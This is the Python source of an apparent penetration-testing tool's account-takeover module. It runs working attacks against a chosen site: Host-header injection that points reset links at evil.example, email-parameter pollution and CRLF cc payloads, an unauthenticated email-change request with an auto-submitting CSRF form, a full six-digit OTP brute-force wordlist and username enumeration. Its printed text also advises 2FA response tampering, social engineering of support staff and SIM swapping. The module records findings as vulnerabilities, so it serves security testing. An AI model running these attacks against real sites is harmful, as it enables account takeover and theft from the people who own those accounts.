"""
modules/account_takeover.py
tmrswrr - Account Takeover Techniques
Password reset flaws, email change abuse, 2FA bypass, account enumeration chains
"""
import os
import re
import time

import requests

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    section,
    success,
    warn,
)
from utils.http import ScopeViolation, get_client

FORM_HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}


def _post_form(client, url: str, data: str, extra_headers: dict | None = None,
               anonymous: bool = False):
    """POST a urlencoded body, returning None instead of raising.

    `anonymous` sends the request with no session cookie or auth token, which is
    what an "can an unauthenticated caller do this?" check actually requires.
    """
    headers = dict(FORM_HEADERS)
    if extra_headers:
        headers.update(extra_headers)
    try:
        return client.post(url, data=data, headers=headers, anonymous=anonymous)
    except (requests.RequestException, ScopeViolation) as exc:
        warn(f"request failed: {exc}")
        return None



def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def password_reset_flaws():
    section("PASSWORD RESET VULNERABILITY TESTING")
    url = _target()
    client = get_client()

    reset_endpoint = prompt("Password reset endpoint (e.g. /forgot-password)")
    email_param    = prompt("Email field name (e.g. email)") or "email"
    victim_email   = prompt("Victim email to test (use your own test account!)")
    attacker_email = prompt("Your attacker email address")

    if not reset_endpoint or not victim_email:
        return

    print(f"""
  {NEON_CYN}Testing password reset flaws:{RST}
""")

    reset_url = url.rstrip("/") + "/" + reset_endpoint.lstrip("/")

    # 1. Host header injection - including the forwarding headers that reverse
    # proxies honour, which the previous version only mentioned in a print().
    info("[1] Host header injection - token sent to attacker domain...")
    evil_host = "evil.example"
    for header in ("Host", "X-Forwarded-Host", "X-Forwarded-Server",
                   "X-Host", "X-Original-Host"):
        resp = _post_form(client, reset_url, f"{email_param}={victim_email}",
                          extra_headers={header: evil_host})
        if resp is None:
            continue
        reflected = evil_host in resp.text or evil_host in str(resp.headers)
        print(f"  {DIM}[{resp.status_code}]{RST} {header}: {evil_host}"
              + (f"  {NEON_GRN}reflected{RST}" if reflected else ""))
        if reflected:
            warn(f"{header} is reflected back into the response")
            add_vuln(f"Host Header Injection via {header}", "High", "A07:2021",
                     f"A password-reset request carrying `{header}: {evil_host}` had that "
                     "host reflected in the response, which is how a reset link gets "
                     "built pointing at attacker infrastructure. Confirm by reading the "
                     "delivered email.",
                     reset_url, evidence=resp.evidence,
                     confidence="Firm", cwe="CWE-644")
    info("Confirm in the received email: a reset link on evil.example proves it.")

    # 2. Predictable token
    info("[2] Token predictability check...")
    import urllib.parse
    tokens = []
    last = None
    for i in range(3):
        resp = _post_form(client, reset_url, f"{email_param}=test{i}@test.example")
        if resp is None:
            continue
        last = resp
        haystack = resp.text + str(dict(resp.headers))
        token_m = re.search(r"token[=:\"' ]{1,3}([a-zA-Z0-9_-]{8,})", haystack)
        if token_m:
            tokens.append(token_m.group(1))
    if tokens:
        info(f"Sample tokens: {tokens}")
        if any(len(t) < 16 for t in tokens):
            warn("SHORT TOKENS detected - may be brute-forceable!")
            add_vuln("Weak Password Reset Token", "High", "A07:2021",
                     f"Reset tokens are shorter than 16 characters: {tokens}. A token "
                     "this short can be guessed within the validity window.",
                     reset_url, evidence=getattr(last, "evidence", None),
                     confidence="Firm", cwe="CWE-330")
        elif len(set(tokens)) < len(tokens):
            warn("Repeated token values across separate requests!")
            add_vuln("Predictable Password Reset Token", "Critical", "A07:2021",
                     f"Separate reset requests produced repeating tokens: {tokens}.",
                     reset_url, evidence=getattr(last, "evidence", None),
                     confidence="Confirmed", cwe="CWE-340")
        else:
            info("Tokens look long and distinct; check for timestamp or counter "
                 "structure by decoding them.")

    # 3. No expiry test
    info("[3] Token expiry bypass...")
    print(f"""
  {NEON_CYN}Test manually:{RST}
    1. Request a reset link
    2. Wait 25 hours
    3. Try using the old token
    4. If it still works → no expiry vulnerability
""")

    # 4. Email parameter manipulation
    info("[4] Email parameter pollution...")
    payloads = [
        f"{victim_email}@{attacker_email}" if attacker_email else f"{victim_email}@evil.com",
        f"{victim_email}%0d%0acc:{attacker_email or 'attacker@evil.com'}",
        f"{victim_email},{attacker_email or 'attacker@evil.com'}",
        f"{victim_email} {attacker_email or 'attacker@evil.com'}",
        f'["{victim_email}", "{attacker_email or "attacker@evil.com"}"]',
    ]
    # What does a plainly invalid address do? Anything that behaves like the
    # *valid* address instead is the interesting case.
    control = _post_form(client, reset_url,
                         f"{email_param}=yeepforge-nobody@invalid.example")
    for p in payloads:
        enc = urllib.parse.quote(p, safe="@,")
        resp = _post_form(client, reset_url, f"{email_param}={enc}")
        if resp is None:
            continue
        marker = ""
        if control is not None and (resp.status_code != control.status_code
                                    or abs(len(resp.text) - len(control.text)) > 32):
            marker = f"  {NEON_GRN}differs from rejected address{RST}"
            add_vuln("Password Reset Email Parameter Pollution", "High", "A07:2021",
                     f"The reset endpoint handled `{p}` differently from an address it "
                     f"rejects (HTTP {resp.status_code} vs {control.status_code}). If the "
                     "second address also receives the reset mail, this is account takeover.",
                     reset_url, evidence=resp.evidence,
                     confidence="Tentative", cwe="CWE-20")
        print(f"  {DIM}[{resp.status_code}]{RST} {p[:60]}{marker}")


def email_change_takeover():
    section("EMAIL CHANGE ACCOUNT TAKEOVER")
    url = _target()

    print(f"""
  {NEON_CYN}Email Change Attack Vectors:{RST}

  {NEON_GRN}[1] No re-authentication required:{RST}
    Change email without confirming current password
    POST /account/email  →  email=attacker@evil.com

  {NEON_GRN}[2] No confirmation link required:{RST}
    Email changes immediately without verifying new address
    Attack: change victim's email to one you control

  {NEON_GRN}[3] CSRF on email change:{RST}
    If no CSRF protection, force email change via malicious link
    <form action="/account/email" method="POST">
      <input name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit()</script>

  {NEON_GRN}[4] Old email still valid:{RST}
    After email change, old email still receives password resets
    Attack: trigger reset with old email before victim notices

  {NEON_GRN}[5] Parallel session attack:{RST}
    1. Attacker opens two sessions
    2. Session A: initiate email change (get verification link)
    3. Session B: change email to something else (cancel the intent)
    4. Use Session A's old verification link anyway
""")

    change_endpoint = prompt("Email change endpoint (e.g. /account/settings/email)")
    if change_endpoint:
        info("Testing email change with no session at all...")
        change_url = url.rstrip("/") + "/" + change_endpoint.lstrip("/")
        # Deliberately unauthenticated: the session headers the engine normally
        # attaches are exactly what this test must not send.
        resp = _post_form(get_client(), change_url,
                          "email=csrf-test@evil.example", anonymous=True)
        if resp is None:
            return
        print(f"  HTTP {resp.status_code}\n  Response: {resp.text[:200]}")
        # 2xx here means an unauthenticated request was *processed*. A 401/403
        # is the correct behaviour and used to be reported as a finding, because
        # "200" was matched against the whole response body.
        if resp.status_code in (200, 201, 202, 204, 302):
            warn("Email change endpoint answered an unauthenticated request!")
            add_vuln("Email Change Without Authentication", "Critical", "A07:2021",
                     f"POST to {change_url} with no session or CSRF token returned "
                     f"HTTP {resp.status_code}. Verify the address actually changed "
                     "before reporting - some apps answer 200 and discard the write.",
                     change_url, evidence=resp.evidence,
                     confidence="Tentative", cwe="CWE-352")
        else:
            success(f"Unauthenticated email change rejected (HTTP {resp.status_code})")


def otp_2fa_bypass():
    section("2FA / OTP BYPASS TECHNIQUES")
    url = _target()

    print(f"""
  {NEON_CYN}2FA Bypass Methods:{RST}

  {NEON_GRN}[1] Direct endpoint access after step 1:{RST}
    After entering username/password (step 1), directly visit /dashboard
    Some apps issue partial session cookie at step 1 → bypass 2FA entirely

  {NEON_GRN}[2] OTP code reuse:{RST}
    Use a valid OTP code twice - should be rejected after first use
    Test with 30-second TOTP codes within the same window

  {NEON_GRN}[3] OTP brute force (no rate limiting):{RST}
    6-digit TOTP = 1,000,000 combinations
    SMS OTP often 4-6 digits = 10,000-1,000,000
""")

    # Generate OTP wordlist
    if prompt("Generate 6-digit OTP wordlist? [y/N]").lower() == "y":
        wl = _out("otp_6digit.txt")
        with open(wl, "w") as f:
            f.write("\n".join(f"{i:06d}" for i in range(1000000)))
        success(f"OTP wordlist (000000-999999) → {wl}")

    otp_endpoint = prompt("OTP verification endpoint (e.g. /auth/2fa/verify)")
    otp_param    = prompt("OTP field name (e.g. code, otp, token)") or "code"
    if otp_endpoint:
        info("Testing rate limiting on OTP endpoint...")
        otp_url = url.rstrip("/") + "/" + otp_endpoint.lstrip("/")
        client = get_client()
        blocked_at, first, attempts = None, None, 0
        for i in range(20):
            resp = _post_form(client, otp_url, f"{otp_param}={i:06d}")
            if resp is None:
                break
            attempts += 1
            first = first or resp
            body = resp.text.lower()
            # 429 is the explicit answer; the wording check is the fallback for
            # apps that lock out with a 200.
            if resp.status_code == 429 or any(
                    x in body for x in ("locked", "blocked", "too many", "rate limit",
                                        "try again later")):
                blocked_at = i + 1
                break
        if blocked_at:
            success(f"Rate limiting kicked in after {blocked_at} attempts")
        elif attempts >= 20:
            warn("No rate limiting after 20 OTP attempts!")
            add_vuln("No OTP Rate Limiting", "High", "A07:2021",
                     "Twenty consecutive wrong OTP submissions were all accepted for "
                     "processing with no lockout, throttle or 429. A six-digit code is "
                     "exhaustible under these conditions.",
                     otp_url, evidence=getattr(first, "evidence", None),
                     confidence="Firm", cwe="CWE-307")
        else:
            info(f"Only {attempts} attempts completed - inconclusive.")

    print(f"""
  {NEON_GRN}[4] Response manipulation bypass:{RST}
    Intercept 2FA response in proxy
    Change "success":false → "success":true
    Change HTTP 401 → 200
    Change "verified":false → "verified":true

  {NEON_GRN}[5] Backup codes enumeration:{RST}
    Backup codes are often 8-10 chars, limited set
    Some apps allow unlimited backup code attempts

  {NEON_GRN}[6] Account recovery flow bypass:{RST}
    "I lost access to my authenticator" flow
    May only verify email/phone → weaker than 2FA
    Social engineering support team for bypass

  {NEON_GRN}[7] SIM swap / SS7 attack:{RST}
    For SMS-based 2FA → contact ISP with social engineering
    Request SIM transfer → intercept victim's SMS OTP
""")


def _error_message(body: str) -> str:
    """The human-readable error text in a login response, if there is one.

    Comparing whole bodies is useless - a CSRF token or a timestamp differs on
    every render - so enumeration is judged on the message alone.
    """
    patterns = [
        r'"(?:message|error|detail|msg)"\s*:\s*"([^"]{4,200})"',
        r'class="[^"]*(?:error|alert|invalid|danger)[^"]*"[^>]*>\s*([^<]{4,200})',
        r"<p[^>]*>\s*((?:[^<]*(?:incorrect|invalid|not found|unknown|does not exist|wrong)[^<]*))",
    ]
    for pattern in patterns:
        m = re.search(pattern, body, re.I | re.S)
        if m:
            return " ".join(m.group(1).split())
    return ""


def account_enumeration():
    section("ACCOUNT ENUMERATION")
    url = _target()

    login_endpoint = prompt("Login endpoint (e.g. /login)")
    user_param     = prompt("Username field") or "username"
    pass_param     = prompt("Password field") or "password"
    if not login_endpoint:
        return

    info("Testing for user enumeration via different error messages...")
    test_cases = [
        ("admin",        "wrongpassword123!"),
        ("notexist_xyz", "wrongpassword123!"),
        ("root",         "wrongpassword123!"),
    ]

    client = get_client()
    login_url = url.rstrip("/") + "/" + login_endpoint.lstrip("/")

    # Three samples per username: one timing measurement cannot distinguish a
    # bcrypt round from a slow hop, and a single body comparison trips over the
    # CSRF token and timestamp that change on every render.
    results = []
    for user, pwd in test_cases:
        timings, last = [], None
        for _ in range(3):
            start = time.time()
            resp = _post_form(client, login_url,
                              f"{user_param}={user}&{pass_param}={pwd}")
            if resp is None:
                continue
            timings.append(time.time() - start)
            last = resp
        if last is None or not timings:
            warn(f"No response for {user!r} - skipping.")
            continue
        timings.sort()
        median = timings[len(timings) // 2]
        results.append({
            "user": user, "response": last, "median": median,
            "message": _error_message(last.text),
        })
        print(f"\n  {NEON_CYN}User: {user!r}{RST} (median {median:.2f}s, "
              f"HTTP {last.status_code})")
        print(f"  Message: {results[-1]['message'][:120] or '(none extracted)'}")

    info("\nAnalyzing response differences...")
    if len(results) < 2:
        info("Not enough successful samples to compare.")
        return

    known, unknown = results[0], results[1]

    # Compare the error *message*, not the whole page: a differing CSRF token
    # makes every raw body comparison report a finding.
    if known["message"] and unknown["message"] and known["message"] != unknown["message"]:
        warn("Different error message for existing vs non-existing username!")
        add_vuln("Username Enumeration", "Medium", "A07:2021",
                 f"The login form answers {known['user']!r} with "
                 f"\"{known['message'][:120]}\" and {unknown['user']!r} with "
                 f"\"{unknown['message'][:120]}\", which reveals which accounts exist.",
                 login_url, evidence=known["response"].evidence,
                 confidence="Confirmed", cwe="CWE-204")
    elif known["response"].status_code != unknown["response"].status_code:
        warn("Different status code for existing vs non-existing username!")
        add_vuln("Username Enumeration", "Medium", "A07:2021",
                 f"{known['user']!r} returns HTTP {known['response'].status_code} while "
                 f"{unknown['user']!r} returns HTTP {unknown['response'].status_code}.",
                 login_url, evidence=known["response"].evidence,
                 confidence="Confirmed", cwe="CWE-204")
    else:
        success("Error responses are indistinguishable between usernames")

    # A real hashing-side-channel is large and consistent; anything under a
    # quarter second on a network round trip is noise.
    delta = abs(known["median"] - unknown["median"])
    slower = max(known["median"], unknown["median"])
    if delta > 0.25 and delta > slower * 0.30:
        warn(f"Timing gap: {known['user']}={known['median']:.2f}s vs "
             f"{unknown['user']}={unknown['median']:.2f}s")
        add_vuln("Timing-Based User Enumeration", "Medium", "A07:2021",
                 f"Median response time over three samples differs by {delta:.2f}s "
                 f"({known['user']}: {known['median']:.2f}s, "
                 f"{unknown['user']}: {unknown['median']:.2f}s) - consistent with the "
                 "password hash only being computed for accounts that exist.",
                 login_url, evidence=known["response"].evidence,
                 confidence="Tentative", cwe="CWE-208")
    else:
        success(f"No meaningful timing difference ({delta:.2f}s)")


def run():
    print_banner("ACCOUNT TAKEOVER",
                 "Password Reset · Email Change · 2FA Bypass · Enumeration")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Password Reset Flaws      {SOFT_WHITE}(Host header, token prediction, no expiry){RST}
  {NEON_CYN}[2]{RST} Email Change Takeover     {SOFT_WHITE}(CSRF, no re-auth, parallel sessions){RST}
  {NEON_CYN}[3]{RST} 2FA / OTP Bypass          {SOFT_WHITE}(brute force, response manipulation){RST}
  {NEON_CYN}[4]{RST} Account Enumeration       {SOFT_WHITE}(error messages, timing side-channel){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": password_reset_flaws()
        elif c == "2": email_change_takeover()
        elif c == "3": otp_2fa_bypass()
        elif c == "4": account_enumeration()
        save_session()
